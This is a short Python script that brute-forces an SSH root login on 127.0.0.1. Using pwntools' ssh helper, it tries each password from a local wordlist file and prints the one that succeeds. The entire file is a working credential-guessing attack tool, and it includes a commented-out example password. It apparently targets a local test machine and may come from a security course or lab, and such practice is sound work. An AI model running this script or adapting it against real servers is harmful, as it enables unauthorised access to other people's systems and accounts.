#!/usr/bin/env python3

import paramiko
from pwn import *

client = paramiko.client.SSHClient()

host = "127.0.0.1"
username = "root"
#password = "Cdac@123"
port= 22
attempt = 0

with open("ssh-pass.txt","r") as password_list:
    for password in password_list:
        password = password.strip()
        print("{} Attempting Password:{}".format(attempt,password))
        attempt+=1
        try:
            response = ssh(host=host,user=username,password=password,timeout=1)
            if response:
                print("✅ Password is {}".format(password))
            response.close()
            break
        except:
            print("❌ Incorrect Password")
